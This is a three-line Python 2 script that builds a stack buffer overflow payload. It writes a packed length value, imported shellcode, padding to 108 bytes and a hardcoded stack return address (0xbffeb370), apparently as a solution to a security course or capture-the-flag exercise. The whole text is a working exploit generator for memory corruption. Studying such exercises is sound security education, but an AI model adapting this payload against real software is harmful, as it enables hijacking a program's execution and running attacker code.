from struct import pack
from shellcode import shellcode 
print  pack("<I", 0x4000000F) + shellcode + 'a'* (108-len(shellcode)) +  pack("<I", 0xbffeb370)
